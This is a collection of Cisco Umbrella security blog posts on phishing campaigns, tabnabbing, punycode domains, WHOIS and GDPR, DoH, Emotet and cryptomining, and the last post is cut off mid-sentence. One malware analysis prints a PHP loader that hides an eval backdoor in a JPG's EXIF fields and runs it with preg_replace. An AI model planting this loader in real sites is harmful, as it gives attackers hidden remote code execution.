{"website": "Cisco-Umbrella", "title": "Today’s Catch: Phishing Roundup – Part 1", "author": ["Andrea Kaiser"], "link": "https://umbrella.cisco.com/blog/todays-catch-phishing-roundup", "abstract": "In this blog post we’re going to cover several aspects of phishing trends that we’ve seen over the past three months. Phishers are always out for your personal information and are using clever ways to fool you into handing it over. By keeping a close eye on tactics and targets, we hope this look into trends will help victims more easily recognize when they’re being phished. Let’s first look into a campaign that was targeting compromised WordPress sites. Take it to the Bank WordPress is a widely used content management system and this popularity no doubt contributes to the allure of attackers to find exploits and compromise websites running it. As far as phishing goes, we see WordPress sites hosting  a variety of different phishing pages that change daily. We’d like to share a summary of some of the URIs being used within the URLs of these compromised sites and also shine some light on the phishing brands being impersonated. From July through August we observed a phishing campaign posing as several Canadian banks, running on compromised wordpress sites, and with similar URIs in the URLs created by the attackers. Surprisingly, the geographic location of the visitors  to these domains, as seen on our resolvers had one country in common, and it wasn’t Canada. It was the Netherlands Common URIs seen across the compromised sites: /wp/tax/taxb/cibc/ /wp/tax/taxb/rbc2/ /wp/taxrev/tax/tax/taxb/atb/ /wp/tax/taxb/desj/ /wp/tax/taxb/bnc/ accountConfirm.php Indentification.php questions.php logging.php The following banks were impersonated July through August: CIBC Royal Bank of Canada ATB Desjardins BNC This campaign looks to be using a phishing kit from the ‘’l33bo_phishers’ group. This phishing kit includes other banks such as TD Canada Trust and Scotiabank. Phishing kit: 167f26fa03b1db4642613661b98ad29bcb10abdb84d2c29c07687fad23a42220 The websites from the beginning of this campaign appear to have taken down the phishes, but we’re still finding new compromised sites which are hosting these phish and that are using this phishing kit. This campaign still appears to be active, up to the publishing of this blog. A phishing page pretending to be BNC bank Be sure to take a look at the full URLs in your browsers before entering any personal account information into an online form. Phishing actors are counting on you neglecting to critique the full URL and instead glance at keywords you recognize and view it as safe. Now that we’re on the subject of inspecting full URLs, we’re going to talk about the Tabnabbing technique. TAB NABIT! THEY STOLE MY PASSWORD! Phishing actors are constantly using new methods to fool victims into giving up sensitive information. They may impersonate the IRS to acquire SSN’s, your company’s IT department to get user passwords, or a bank login to gain access to financial accounts. The delivery methods don’t change too often, but another type of phishing is being presented to victims in an unusual way. You know that trick you used to play on your friends when you were a kid? Like say your friend had a bowl of jelly beans and you wanted one. You’d be like “Hey! What’s that over there!?” And then when your friend turned around, you’d take a jelly bean and eat it. SNEAKY! Well this phishing technique is sort of like that. A minor difference is that instead of taking a jelly bean, you replaced the bowl of jelly beans with a username and password prompt that looked like a bowl of jelly beans. Follow? As unlikely as this scenario is at fooling anybody, the real thing is a bit more devious. In this scenario, the attacker will post a link on a public forum or chat software, which we’ll call Tab1. When the victim clicks on the link, the website is opened in a new tab, which we will call Tab2. While you’re viewing Tab2, the domain triggers a javascript function (window.open) that somewhat covertly changes the website of Tab1 to a credential harvesting page designed to convincingly look like the page it’s posing as. Modern browsers have begun to mitigate against this, but malicious code running on a system can still pop up new browser windows that will do the similar impersonation attempts. Phishers know that it’s best to attack you when your guard is down, and this method is so sneaky that I almost didn’t notice it at first. They say that the best defense from a phishing attack is knowledge of their methods and procedures and keeping a sharp eye, so having knowledge of this attack makes you that much less likely to be phished in the future. Attackers also use punycode to encode internationalized domain names, and this displays a URL in your browser that VERY closely mimics the real thing, even though the characters are totally different. A recent example of a punycoded domain is, xn--denizbankas-9zba[.]com , when converted looks like denizbankasıı[.]com in the web browser. Which is a good replica of denizbank[.]com if not closely inspected. DenizBank is a large private bank in Turkey. We first resolved this domain in July. As of the publishing of this blog, it no longer resolves. Come back next Monday to learn about the latest brands we have observed trending in phishing over the past 3 months. Why Cisco Umbrella? Umbrella protects users from connecting to malicious sites on the Internet and analyzes over 180 billion DNS requests daily. The sheer volume of DNS requests gives our Researchers a unique view of the Internet to better identify trends on threats, faster. Interested in trying out Umbrella? Sign-up for a free 14 day trial today .", "date": "2019-08-26"},
{"website": "Cisco-Umbrella", "title": "Malware or Maleficent: How well do you know your villains?", "author": ["Natalie Pino"], "link": "https://umbrella.cisco.com/blog/malware-maleficent-well-know-villains", "abstract": "Every good story needs a villain — and the world of network security has plenty of them. We’ve got a fun new diversion for you for when you need a break from fighting the bad guys. Test your malware IQ (and your knowledge of fairy tales) by taking our quiz, Malware or Maleficent? It’s quick — if you know your stuff! You’ll advance through a series of eight questions by correctly identifying the virus from the villain. Have fun!", "date": "2018-03-23"},
{"website": "Cisco-Umbrella", "title": "Now available: Umbrella reporting API & management API", "author": ["Negisa Taymourian"], "link": "https://umbrella.cisco.com/blog/reporting-api-management-api", "abstract": "When we built Umbrella, we wanted everything — from deployment to interacting with the dashboard — to be a delightful experience for our users. But sometimes delivering a great user experience has nothing to do with Umbrella itself, but how we can build Umbrella to work with our customers own tools and workflows. That’s where APIs come in. Today, we have APIs that do some pretty amazing things, such as add more value to existing products and make the deployment of Umbrella across a Meraki network even easier. In the future, we want to extend the capabilities of Umbrella even further — by allowing our customers to do anything they currently do in our product via API. We’re excited to announce two new APIs that bring us closer to that goal — the reporting API and management API. Reporting API When investigating suspicious domains, time is of the essence. Analysts need to be able to gather information fast — and accessing it needs to be easy. Analysts need to be able to effectively filter through massive amounts of data and identify the relevant security events. But this is often difficult to do since only a minute portion of all events are related to a security event. The new reporting API enables security teams to quickly extract key events from Umbrella and easily access the events via their SIEM, TIP or any other security orchestration tool. The API significantly improves search for risky domains by allowing analysts to view Umbrella events and queries tied to known malicious and suspicious domains, as well as relevant data from other security tools all on a single pane of glass. In addition, the API allows analysts to be able to easily evaluate the level of exposure to a malicious or suspicious domain by reviewing a snapshot of key details such as total volume of DNS resolutions for the domain and the specific users affected within their network. Customers can also use the reporting API to integrate their Umbrella data with other threat intelligence in Cisco Threat Response . The reporting API is now available for customers with any Cisco Umbrella enterprise package. Management API We developed the management API to provide direct customers, multi-org users, SPs, MSPs, and MSSPs with the ability to manage Umbrella at scale. The new management API enables customers to automate processes and aggregate customer data and management. Administrators can easily complete tasks such as creating, reading, updating, or deleting identities using their own internal tools. What does this look like in the real world? Super Secure, Inc. is a (fictitious) MSSP with (real) challenges — they needed a streamlined way to manage Umbrella that fit into their unique workflows. With the management API, they can complete a number of tasks quickly and easily using a single pane of glass approach. Let’s look at an example : New customer provisioned by the Super Secure, Inc. via API. Internal script is able to check that all customers are sending traffic. A new router is provisioned that doesn’t point DNS to Umbrella. MSSP is notified immediately within their internal tool and remediates. This is just one example. We’re looking forward to the many ways customers will take advantage of the API. To learn more about configuring the management API, read the technical documentation. Stay tuned for more updates around our API journey next month. Resources: Umbrella APIs overview Management API – technical documentation", "date": "2018-10-09"},
{"website": "Cisco-Umbrella", "title": "Now available: EfficientIP and Cisco Umbrella Integration", "author": ["Chris Riviere"], "link": "https://umbrella.cisco.com/blog/now-available-efficientip-and-cisco-umbrella-integration", "abstract": "You may have seen some recent announcements on the Umbrella Network Device API . What’s really cool about this new API, is that it can make pointing DNS to Umbrella even easier while at the same time providing additional attribution. Just take a look at the recent integration we did with Meraki , which enables easy and fast Umbrella deployment across a wireless network. You can point thousands of Cisco Meraki MRs to Umbrella in a matter of minutes and get additional functionality such as encryption of DNS traffic from the MR to Umbrella, attribution down to SSID, and even private IP! I’m happy to announce that one of our technology partners, EfficientIP , has recently done something similar leveraging this same Network Device API. I was fortunate enough to attend Efficient IP’s APAC partner kickoff event last month in Bangkok, Thailand where this new integration was discussed in detail. This integration enables a few key capabilities: Allows EfficientIP and Umbrella customers to instantly point DNS to Umbrella providing rock solid DNS resolution and a first line of security against threats Instantly provides privacy/security by encrypting all the DNS queries from the EfficientIP appliance to the Umbrella resolvers Allows for more specific attribution such as the private IP address of devices behind the EfficientIP appliance I like to look at this simply as a way of providing most of the functionality of a virtual appliance without having to deploy one! Check out how easy it is to deploy below: 1. Link Accounts In the Umbrella dashboard, copy your API key and Secret key. 2. In a text editor, prepare the following line: /usr/local/nessy2/script/umbrella_setup <key> <secret> <device_hostname> Where key, and secret key are from the Umbrella Dashboard. The device_hostname is the device that will appear in the Umbrella Network devices list. 3. Paste this line in the following locations via SSH session to Solidserver: /data1/etc/namedb/global_include.conf /data1/etc/namedb/options_include.conf after the line listen-on { !127.0.1.0/24; any ; }; /etc/rc.conf Change dnscrypt_proxy_enable=”YES” Add the following as the last line in the file: ifconfig_lo0_alias53=”inet 127.0.1.53 netmask 255.0.0.0” 4. Login to Solidserver UI Go to (1) DNS (2) Servers (3) Select the appropriate caching DNS server. Right click the Solidserver DNS and click properties. 5. Click the Edit button under the forwarding tab 6. On the pop up window, click Only under Forwarder Mode. Type 127.0.1.53 under Forwarder IP. Click Add. Click OK once. 7. Click the administration tab and reboot the appliance. 8. You will see the successful registration of the Solidserver in the Umbrella portal. 9. All external DNS queries can be observed through the Umbrella portal with additional attribution under activity report. You’ll see this includes the name of the EfficientIP appliance, the DNS query being made, and the internal IP which made the request. You can learn more about this integration on EfficientIP’s Umbrella integration page .", "date": "2019-05-08"},
{"website": "Cisco-Umbrella", "title": "Introducing @PhishTank_Bot", "author": ["Andrea Kaiser"], "link": "https://umbrella.cisco.com/blog/introducing-phishtank_bot", "abstract": "Out of the Net, into the Tank PhishTank started in 2006 with the idea to help make the Internet a better place by sharing free phishing data with the help of our online community. Over 5.3 million phishes have been submitted and 2.2 verified as valid threats. We’re still growing strong thanks to our community! You can already access PhishTank data via XML, CSV, PHP and JSON through it’s API. We’ve now created a new way to keep up on the latest valid phishing submissions: The @PhishTank_Bot twitter handle . Meet @PhishTank_Bot PhishTank Bot will tweet the latest verified phishing URLs every hour. We hope that this will help provide a quicker look into the data available for our users that use Twitter for Open Source Intelligence Gathering. Phishing is one of the most widely used infection vectors for getting malware onto a system, harvesting user credentials and gaining unauthorized access to systems and information. PhishTank data is integrated into Cisco Umbrella and we use this intelligence to predictively block more threats and the related malicious infrastructure hosting the attacks. Tweets by PhishTank_Bot If you’d like to help in the fight against phishing visit the PhishTank website , where you can help by submitting suspected phishing pages or verifying other submissions. Thank you for helping to clean up the Internet!", "date": "2017-11-27"},
{"website": "Cisco-Umbrella", "title": "GDPR and WHOIS: Here's What You Need to Know", "author": ["Kevin Rollinson"], "link": "https://umbrella.cisco.com/blog/gdpr-and-whois", "abstract": "On May 25th, 2018, the General Data Protection Regulation (GDPR) went into effect. While the regulation is intended to protect the privacy of individuals, ironically, it created a last-minute scramble that caused millions of unsolicited emails to be sent around the world notifying customers of updated privacy policies and making requests for marketing consent. The impact of GDPR is being felt not only by businesses and individuals, but also by security researchers, investigators, and those who offer security products and services that rely on WHOIS data. GDPR impacts everyone who processes EU personal data.  To understand that impact, it might be useful to understand who’s involved and how we got to this point. We’ll attempt to provide an overview here, in layman’s terms, before we share our thoughts on how it will impact Cisco Umbrella.  (Feel free to skip to the last section if you’re up to speed on GDPR and WHOIS.) What is the GDPR? In short, the GDPR is a European Union data protection regulation – the law for all 28 member states. The regulation is a result of years of negotiation and drafting among the European Parliament, Council of the European Union, and European Commission that built upon decades-old privacy principles and the 1995 EU Data Protection Directive. The result was a robust, risk-based data protection law calling for transparency, fairness, and accountability when processing EU personal data. To drive compliance, the GDPR comes with enhanced penalties for egregious misconduct — up to 20 million Euros (roughly $23.5 million at the time of writing) or 4 percent of the offender’s worldwide annual revenue, whichever is greater. As an EU law, GDPR was intended to protect EU citizens; however, it actually protects anyone within EU borders (citizen, resident, visitor, or otherwise) and applies to companies outside of the EU to the extent they are monitoring activities or offering goods and services to persons physically in the EU, irrespective of citizenship status. IANA, ICANN, and WHOIS Developed mainly for government, academic, and military sites, the Net’s early domain and naming management was the responsibility of a single individual. Jon Postel earned his Ph.D. in Computer Science at UCLA in 1974, and was key in the creation of IANA, the Internet Assigned Numbers Authority. More of a function than an organization, Jon lead IANA, working for USC’s Information Sciences Institute until his death in October 1998. (Side note: A fascinating history of Jon’s contributions and the standards, policies, and culture he helped to create were captured in a web archive dedicated to his honor.) ICANN (Internet Corporation for Assigned Names and Numbers) was formed in 1998, when USC entered a contract to transition IANA’s functions to a not-for-profit corporation as part of a private-public partnership. IANA became a division of ICANN, which among other things, had responsibility for “IP address space allocation, protocol identifier assignment, generic (gTLD) and country code (ccTLD) Top-Level Domain name system management, and root server system management functions.” As part of this management, ICANN provides accreditation to registrars all around the world, accepting registration and contact information for registered domains and publishing via a protocol or service known as WHOIS . WHOIS has been the defacto source for those seeking information for domains and their owners, including names, addresses, emails, and phone numbers for administrative and technical contacts. I had written more here, but since I’m not an attorney (and need to get this blog post approved by our attorneys), I’m scrapping my attempt at more thorough explanation. What’s important to note is that some registrars have redacted data from WHOIS, while it looks like others may keep publishing . That means the service may end up being less valuable to brand owners, lawyers, and cybersecurity researchers who utilize WHOIS to perform tasks, like identifying malicious domains or researching infringement claims, for example. Courtesy of Cisco Security Research Analyst Artsiom Holub On May 17th, ICANN’s board voted to approve a “Temporary Specification.” What’s to note here is the reference to a proposed “tiered-access” system. Under that system, a great deal of personal information will be unavailable to the public, but certain vetted third-parties who have a “legitimate interest” and receive accreditation from ICANN might be granted less restricted levels of access to WHOIS data. The #ICANN Board has voted to adopt the Temporary Specification for gTLD Registration Data. More information can be found at https://t.co/rQ7lQoAiRh and in Board Chair, Cherine Chalaby’s, latest blog post https://t.co/KoPCV7Aq1M pic.twitter.com/Vob3i1Myvw — ICANN (@ICANN) May 18, 2018 Impact on security research & Cisco Umbrella As we mentioned at the start of this post, WHOIS has been a valuable tool for security researchers looking to investigate domains. Registration records create a breadcrumb trail of sorts, and are especially useful when cyber criminals recycle or reuse any of the registration information they provide. KrebsOnSecurity recently challenged a widely-held belief that WHOIS isn’t reliable because cyber criminals don’t use their real information when they register a malicious domain. According to Krebs, “Whether or not cyber crooks do provide their real information is beside the point. ANY information they provide — and especially information that they re-use across multiple domains and cybercrime campaigns — is invaluable to both grouping cybercriminal operations and in ultimately identifying who’s responsible for these activities.” In addition, while some registrars offer WHOIS privacy services, cyber criminals aren’t always willing to pay for these services. Even when they do, a “brief window of visibility” into the details of the registration may be captured and indexed when a registrant moves to a different hosting provider. If a phishing site is only online for a few hours, WHOIS data becomes another tool in the toolbox, providing a point-in-time record that could help to identify and thwart malicious behavior. In speaking with Cisco Security researchers and investigators, it is clear that the registration details in WHOIS records are useful, but they’re not the only breadcrumbs that cyber criminals leave behind. True, our teams utilize a WHOIS classifier used to block domains that may not be very useful in the short term should registration details cease to be published, but our incredible team of dedicated security professionals have other tools in the toolbox in the form of robust classifiers, algorithms, and statistical models we rely on to identify and block threats. Not having WHOIS data is akin to a bank robber who wears a mask. Even if we can’t see the robber’s face, we undoubtedly have other details like height, weight, a description of the getaway vehicle, witness testimony, and surveillance video. Plus, we can see if there are other recent robberies and test for fingerprints or DNA or some other identifying factors. Sure, it would have been easier had the robber not worn a mask, but we expect robbers to disguise themselves, and we have developed ways to get around that. To sum it up, while Cisco Umbrella Investigate customers may soon be unable to view complete WHOIS data in the dashboard as they have in the past, GDPR is not expected to significantly impact our overall ability to identify and block threats. Until the dust settles on GDPR and WHOIS, the security community expects that some cyber criminals may look to take advantage of the uncertainty. If you’re not already a Cisco Umbrella customer, now might be a good time to take advantage of our free trial . A special thanks to Artsiom Holub for contributing to this post. You can follow Artsiom at @Mesiagh", "date": "2018-05-31"},
{"website": "Cisco-Umbrella", "title": "Introducing Threat Busters: A Game of Threat Intelligence", "author": ["Leigh Bushnell"], "link": "https://umbrella.cisco.com/blog/introducing-threat-busters-a-game-of-threat-intelligence", "abstract": "We’ve been on a mission to protect the world from internet-based threats since the launch of our enterprise security product, Cisco Umbrella (formerly OpenDNS), in 2012. We talk a lot about what our product can do and the threats it’ll block you from, but we don’t talk enough about the research team that powers our product and how they do it. Today, we’re changing that. Introducing Threat Busters : A new digital adventure where you can access our team’s latest security research and hunt down threats in a retro, underground cyberworld while you do it. If you’re feeling competitive, find as many “Easter eggs” as you can to boost your score and join our Leaderboard. The site is live with content on malicious cryptomining, ransomware and phishing and the cyberattacks XBash, DanaBot and Roaming Mantis. We’ll continue to add new threat and attack content monthly, based on what we see happening in the security space. Here’s a sneak peak of what is live: Threat Trend Graphs With 16,000+ enterprise customers in over 160 countries, we have a unique view of corporate internet traffic. For both malicious cryptomining and phishing, we’ll show you traffic by company size, vertical and geography, as well as the overall traffic trend for December 2018 through February 2019. Above is a pie chart showing top phishing traffic by vertical for the period December 2018 through February 2019. Traffic trend graphs for ransomware are coming soon. How Cisco Umbrella blocks threats It might be enough for you to know that Umbrella blocks these threats and attacks, but have you ever wondered how it’s actually done? For each threat and attack featured we’ll tell you how our team blocks the threat in question, from using open-source intelligence (OSINT) to algorithms and everything in-between. We also include a list of Indicators of Compromise (IOCs) on the attack briefing pages. We do this so that any member of the information security community can use them to identify potentially malicious activity on their own system or network and improve early detection of future attack attempts using the intrusion detection systems (IDS) and security information and event management systems (SIEM). What cyber attacks are roaming the internet? We’ll handpick current attacks that we see roaming the internet and give you background on the threat, how Umbrella blocks it and illustrate how the attack works. Cisco Umbrella & Talos Security Intelligence Cisco Umbrella, also benefits from the Talos Security Intelligence and Research Group. We leverage their threat intelligence to help detect, analyze and protect against both known and emerging threats. Take the first step to making your organization more secure. Happy exploring!", "date": "2019-03-18"},
{"website": "Cisco-Umbrella", "title": "DoH! To block or not to block?", "author": ["Rachel Ackerly"], "link": "https://umbrella.cisco.com/blog/doh-dns-over-https-to-block-or-not-to-block", "abstract": "There is a lot of buzz about DoH right now. So we thought we’d just join the discussion and educate our loyal users on what all the fuss is about. First, I’m sure you all know what DoH is — but let’s just spell it out. DoH stands for DNS-over-HTTPS, a standard published by the IETF. DoH can increase user privacy and security by preventing eavesdropping and manipulation of DNS data by man-in-the-middle attacks. Plus it can often improve performance. Sounds pretty good, right? How does DoH work? DoH works just like DNS, except it uses Transmission Control Protocol (TCP) to transmit and receive queries. Both take a domain name that a user types into their browser and sends a query to a DNS server to learn the numerical IP address of the web server hosting that site. The key difference is DoH takes the DNS query and sends it to a DoH-compatible DNS server (resolver) via an encrypted HTTPS connection on port 443, rather than plaintext on port 53. DoH prevents third-party observers from sniffing traffic and understanding what DNS queries users have run, or what websites users are intending to access. Since the DoH (DNS) request is encrypted, it’s even invisible to cyber-security software that relies on passive DNS monitoring to block requests to known malicious domains. But DoH isn’t for everyone. Just because some vendors (like Mozilla) may enable DoH by default for users, doesn’t mean you have to use DoH. Say yes or no to DoH! Because DoH is configured on the application, the DNS servers configured by the operating system are not used. This means that the protection provided by Cisco Umbrella may be bypassed by applications using DoH. For this reason, Umbrella includes known DoH servers in the “Proxy / Anonymizer” content category. Customers can further improve coverage by also blocking Newly Seen Domains. Additionally, Cisco Umbrella supports the “use-application-dns.net” domain as defined by Mozilla to prevent Firefox from enabling DoH by default. Note that Firefox will still enable DoH if the user manually configures a DoH server, in which case we recommend taking the steps outlined in the article below. You can find more information on preventing the circumvention of Cisco Umbrella in our Knowledge Base. Say yes to better cybersecurity Most companies leave their DNS resolution up to their ISP. But as more organizations adopt direct internet connections and users bypass the VPN, this leads to a DNS-blind spot. Monitoring DNS requests, as well as subsequent IP connections is an easy way to provide better accuracy and detection of compromised systems, improving security visibility and network protection. If you’re looking for an easy way to protect your users on and off-network, check out Cisco Umbrella . Umbrella is the fastest and easiest way to protect all of your users enterprise-wide in minutes, and reduces the number of infections and alerts you see from other security products by stopping threats at the earliest point. With no hardware to install and no software to manually update, ongoing management is simple. Don’t believe us? You can monitor your DNS traffic for FREE with DNS Monitoring. Better visibility is just a click away » Sign up for DNS Monitoring", "date": "2019-09-11"},
{"website": "Cisco-Umbrella", "title": "Emotet malspam trojan — the gift that keeps on giving", "author": ["Kevin Rollinson"], "link": "https://umbrella.cisco.com/blog/emotet-malspam-trojan-the-gift-that-keeps-on-giving", "abstract": "Last year, our threat researchers highlighted the Emotet malspam campaign which sent out unwanted gifts to email inboxes. The emails appeared to be sending recipients a holiday gift card — but instead, they included links that would download malicious word documents. A year later, the Emotet malspam trojan remains one of the most active malware families. Development has continued on the malware with new features and modules still being added. What is Emotet malspam trojan? Emotet is a trojan that is typically spread through spam emails. The trojan module is capable of loading and installing additional malware, stealing online credentials and personal sensitive information. The bypass component enumerates network resources looking for servers — for each one it finds, it will try to bruteforce the administrator and user accounts. This lets the malware spread via default admin shares and shared folders using SMB to establish persistence. Additional data gathering capabilities include, but are not limited to, email exfiltration, collecting sender and destination names from the interpersonal message (IPM) root folder, harvesting emails that have been sent or received within the last 180 days. This method of harvesting data en-mass allows for a weaponized and data-driven analytical capability that increases the effectiveness and spread of the Emotet trojan. We observed the following secondary payloads: TrickBot, IcedID, QuakBot, AzoRult, Ursnif/Gootkit, and Zeus Panda Banker Trojans. How can Cisco Umbrella help? Malspam campaigns are highly automated and able to generate up to 500 weaponized documents hosted on compromised domains daily. Our internal security research team developed a Malspam classifier to automatically block Malspam campaigns. These blocks of the compromised domains hosting weaponized documents are derived from multiple sources including open-source intelligence (OSINT), infrastructure telemetry hunting algorithms, partner relationships and Umbrella’s research on co-occurrences and related domain models. Intelligence typically includes indicators gathered from malware, IPs, domains, campaign research and threat actor developments. When Emotet is detected, Cisco Umbrella will block at the IP and domain level, as well as analyze risky domains using a selective proxy . How we gather threat intelligence for Cisco Umbrella There are three key factors that make up our unparalleled threat intelligence: data, security researchers, and statistical and machine learning models. Umbrella resolves over 175 billion DNS requests daily, far more than any other security vendor, giving our researchers a unique view of the internet. This view allows us to quickly and effectively identify threat trends. Our industry renowned researchers are constantly finding new ways to uncover fingerprints that attackers leave behind by building new statistical and machine learning models. These models automatically classify our massive amounts of data. If you’d like to take advantage of our threat intelligence and protect your organization against threats such as Emotet, try Umbrella for free.", "date": "2019-03-08"},
{"website": "Cisco-Umbrella", "title": "Picture Perfect: How JPG EXIF Data Hides Malware", "author": ["Shyam Sundar Ramaswami"], "link": "https://umbrella.cisco.com/blog/picture-perfect-how-jpg-exif-data-hides-malware", "abstract": "When we’re not busy threat hunting, we enjoy a good superhero movie. In the same way that the DC franchise is on a movie release spree, malware can follow a similar pattern: either dormant and biding it’s time, or taking the world by storm. Knock, Knock, the Doc! Malware hiding in document files or PDFs is a well known evil. Lurking inside macros, bits of javascript, and other dynamic elements that run the malicious code, these files serve as a big problem for conventional users. Because these sorts of files are so popular for both work and personal use, victims do not always suspect them as vectors for attack. As it turns out, the same is true for image files. Worth a Thousand Words Macro based malware lurking in PDFs or documents has been around for so long that it deserves a fresh look. You could call it “old wine in a new bottle”, but sticking with the movie theme, we like to think of it as a reboot of old classics like Die Hard or Jumanji. Malware that hides in EXIF headers of images was reported by Sucuri a few years ago and has been known for some time, so it’s not new, but we are seeing new ways of implementation. For example, a Cisco Umbrella user reported receiving a seemingly legitimate email which contained a URL to an image, that looked something like: maliciousexample.com/agagag/3egdha.jpg When we get samples from our customers, the analysis is pretty straight forward. We closely review the document, any linked URLs or PDFs, and inspect the resources for malicious components such as macros for word documents, or web page content and domain names for phishing campaigns. In the case of the email pointing to a single .JPG, that analysis breaks down a little since it doesn’t appear suspicious right off the bat. We may review the headers of the email or the domain of the link trying to identify what is malicious, but we ordinarily don’t assume that the .JPG itself is the vector for malware. We’re not the only ones to miss this vector. Online sandboxes can also come up empty, depending on how they’re configured when analyzing the submission: Just because our first attempt at a sandbox analysis didn’t find anything, does not mean that we would assume that there’s nothing to find. Why would our customer get an email pointing to a .JPG for no apparent reason? The actor that sent this email wants something, and it’s up to us to dig deeper. All we have to go on at this point is an image file. It’s possible steganography is being used to conceal malicious code, a technique known as stegosploiting . Downloading the .JPG and running it through steganographic libraries didn’t reveal anything in this case. There was no hidden pattern or marker in the image to trigger a malicious attack. But when we analyzed the image file through a sandbox environment configured differently than the first, the service identified the image as a trojan. At this point, suspicions were definitely raised. We know the customer received this mail from a source that they do not trust, which implies a malicious actor. Blocking the host domain and noting the file hash is a solid step, but maybe we can find evidence of something hidden in the binary of the .JPG. We began to analyze the file manually through Notepad++ and found some interesting data that shouldn’t be in the file: data that looks like it might be javascript eval statements: Now we’re onto something! .JPG files commonly have metadata to go along with the images, textual information that can include the name of the photo or photographer, where it was taken, the time and date that the image was made, and many other snippets of useful data. Extracting the metadata of an image is easy, and in this case, it turns out to be exactly what we’re looking for: Look at the strange “Make” and “Model” values. The “Make” has a value of “/.*/e” and the “Model” is an eval function! It evaluates the decoded base64 string that is present. This is a big clue as to how this malware functions. If you don’t know by now, it’s very rarely a good idea for programs to evaluate a decoded base64 string. So let’s see what this base64 string decodes to: This is the last piece of the puzzle for us. Putting the pieces together, we can deduce the following: The malware works in stages. The first stage of the malware comes from the domain that was infected and compromised. The second stage is the search and replace function hidden in EXIF headers in the .JPG file. The first stage site was taken down quickly, and we could not retrieve the code for that step. Assuming a typical multi-stage delivery of malware, we can expect that the following could have happened: The site that hosted the malicious JPG could have contained this: $exif = exif_read_data(‘/home/path/images/dir1/gagagate/3ecfgagsag.jpg’); preg_replace($exif[‘Make’],$exif[‘Model’],”); The function “exif_read_data” reads the exif header from an image file, and in our example specifically reads the “Make” and “Model” labels as shown above. From our example, it then executes and decodes, calling POST variable ‘zz’. The key aspect here is that the code does not look malicious at all. Instead, it looks like more of a search and replace function, which is why the sandbox environments may not have detected them as malicious. Searching and replacing by itself isn’t something that would be flagged. Additionally, the attacker needs to send a proper POST request, replacing the variable “zz” with malicious instructions. Window to the Malware So how do these otherwise benign sites get compromised to act as backdoors? One way is out of date software plugins. Old versions of WordPress and Joomla may allow attackers to get access to sites based on their security vulnerabilities. They then end up hosting stealthy malicious images or even phishing urls. Small scale or low key shopping websites are often the victims, but it isn’t limited to retail shops. Even enterprise sites and blogs get compromised frequently. One of the major problems is failure to update their plug-ins regularly. Plug-ins are not something you can buy once, install, and never worry about again. It is instead like buying an elevator, then not servicing it and expecting it to run error free for the life of the building. A Picture of Health JPG malware is not that common, but it can be very nasty. Attackers can target stock images that are common in powerpoint presentations and embed malicious code either using stegosploit or infect the site that hosts the stock images for slides. When these pictures are added into presentations, this could create a widespread issue, as presentations are usually shared between many people. One stage of the code can connect to these compromised websites or to websites that are hosted by bulletproof hosting providers.  This could be used to drop malicious payloads onto systems. Why Umbrella? Umbrella protects users from connecting to malicious sites on the internet and analyzes over 180 billion DNS requests daily. The sheer volume of DNS requests gives our researchers a unique view of the internet to better identify trends on threats, faster. Umbrella uses statistical models to hunt for domains tied to malicious infrastructure. In this way, Umbrella can stop infections before they happen and help you stay one step ahead of malicious actors. Want to give threat hunting a try? Check out our new interactive Threat Busters game. Interested in trying out Umbrella? Sign-up for a free 14 day trial today. IOCs : SHA-1 73290413ff944a48b749fbd0f32ff8368a2b36c1 SHA-1 abdd0bfd113666a48ae202358eb2c7d19f09f0fa", "date": "2019-07-24"},
{"website": "Cisco-Umbrella", "title": "Today’s Catch: Phishing Roundup – Part 2", "author": ["Josh Pyorre"], "link": "https://umbrella.cisco.com/blog/todays-catch-phishing-roundup-part-2", "abstract": "Last week we discussed some trends that we observed in phishing over the past three months . We highlighted a campaign against Canadian banks hosted on compromised WordPress sites and techniques to disguise URLs. Today in part two of our phishing roundup, we’re going to look at trending brands from the past three months. Since June, 2019, we’ve been manually analyzing compromised domains reported by a specific intelligence feed, that many security vendors and researchers might consider benign at first glance. The small set of data we’re looking at is an average of 30 malicious URLs per day – enough to get an idea of what’s going on in some areas. While compromised sites and custom domain names are still extremely common, phishing URL’s are commonly found on cloud providers such as onedrive.live[.]com, webcore.windows[.]net, and blob.core.windows[.]net. These services make setting things up easier for an attacker, and they appear more legitimate to the victim. Regardless of where the phish is stored, a significant amount of what we see are targeting just a few services and businesses. Compromised vs Non-Compromised: Compromised sites may end up targeting specific users of a service, but it’s the domains that were set up just for one kind of phish that will typically have more of a target demographic in mind. Looking at three months of data, we observed 278 compromised domains and 504 non-compromised domains. This means we’re seeing a lot more domains set up just to get victim credentials or to deliver some kind of malware. The majority of most common brands observed in our analysis over the three month time frame are not too surprising: Microsoft Office 365 phishes are the most popular, and these are typically residing at URLs like: The second most common phish from one of our intelligence sources that we’ve been seeing is an unexpected one: Banorte Bank. Banorte[.]com was created in 1998, so they’ve been around a while. It’s popularity on our resolvers is fairly high when viewing the number of DNS queries through Umbrella. The phishes generally just mirror the Banorte home page in an attempt to steal credentials, and they are most-commonly found at URLs which have been set up using a name that is similar to ‘banorte’, rather than compromised: After the Microsoft-themed phishes, we see a fairly even mix of many other brands. Banking (other than Banorte) is probably the largest industry being targeted. Social media and technology companies are the next largest after that. Brand Watch If interested in finding lexically similar domains to your brand or company, we have a script available called ‘Brand Watch’. Download Brand Watch here . If you want more information on how Brand Watch works, check out this blog post .", "date": "2019-09-04"},
{"website": "Cisco-Umbrella", "title": "Mounting Mining Mayhem", "author": ["Patrick Colford"], "link": "https://umbrella.cisco.com/blog/mounting-mining-mayhem", "abstract": "Rise of the Cryptominers As cryptocurrencies continue to increase in value, cryptomining becomes increasingly more lucrative. With Bitcoin nearly reaching $18,000USD/1BTC, speculation that other cryptocurrencies such as Etherium and Monero may hit this mark eventually is rising. Monero is especially interesting given that one of its primary advantages is the relatively low processing power needed to mine it. Given that it is capable of being mined even by consumer grade computers, many organizations have tried to capitalize on this facet of the currency. Launched in September of this year, Coinhive is a service that has transformed the internet already in its short life. Coinhive allows users to embed JavaScript API calls to enable anonymous mining of Monero cryptocurrency in browsers. Monero aims to improve on existing cryptocurrency design by obscuring the sender, recipient and amount of every transaction made, as well as making the mining process more egalitarian by lowering processing costs. Though Coinhive as an organization has said they want users to come up with new uses for their service, it’s hard to imagine they wanted users to create apps that then go on to be abused. When programs have no reference to cryptomining at all , how are consumers supposed to make educated choices about their best options? Coinhive isn’t the only game in town. Crypto-Loot , launched in October of this year, similarly allows users to embed API calls to have their end users mine Monero silently or publicly. With Monero’s emphasis on privacy and the distributed nature of its mining, how can we accurately gauge its adoption and measure its use? How Deep Do These Mines Go? Trying to accurately understand how much cryptomining is 